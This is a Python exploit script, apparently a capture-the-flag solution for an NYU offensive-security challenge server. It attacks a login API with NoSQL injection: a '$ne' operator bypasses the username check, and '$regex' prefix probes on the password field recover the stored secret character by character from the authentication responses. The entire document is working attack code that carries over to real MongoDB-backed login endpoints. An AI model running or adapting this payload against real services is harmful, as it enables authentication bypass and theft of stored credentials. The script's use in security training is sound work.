import requests
import string

def create_injection_payload(current_prefix, test_char):
    return {
        "username": {"$ne": None},
        "password": {"$regex": f"^{current_prefix}{test_char}"},
        "$where": "this.error = this.password"
    }

def send_request(target_url, injection_payload):
    try:
        return requests.post(target_url, json=injection_payload)
    except requests.RequestException as error:
        print(f"[!] Request error: {error}")
        return None

def perform_injection(api_endpoint, allowed_chars, initial_prefix="flag{"):
    flag = initial_prefix
    print("[*] Beginning injection process to retrieve the flag...")

    while not flag.endswith("}"):
        for char in allowed_chars:
            payload = create_injection_payload(flag, char)
            response = send_request(api_endpoint, payload)

            if response and response.status_code == 200:
                try:
                    response_data = response.json()
                    if response_data.get("authenticated", False):
                        flag += char
                        print(f"[+] Character found: {char} | Current flag: {flag}")
                        break
                except ValueError:
                    print("[!] Failed to decode JSON response.")
                    continue
        else:
            print("[!] Unable to identify the next character. Stopping process.")
            break

    return flag

if __name__ == "__main__":
    endpoint_url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:10000/api/login"
    character_pool = string.ascii_letters + string.digits + "{}_!@#$%^&*()"

    extracted_flag = perform_injection(endpoint_url, character_pool)
    print(f"[+] Successfully retrieved flag: {extracted_flag}")
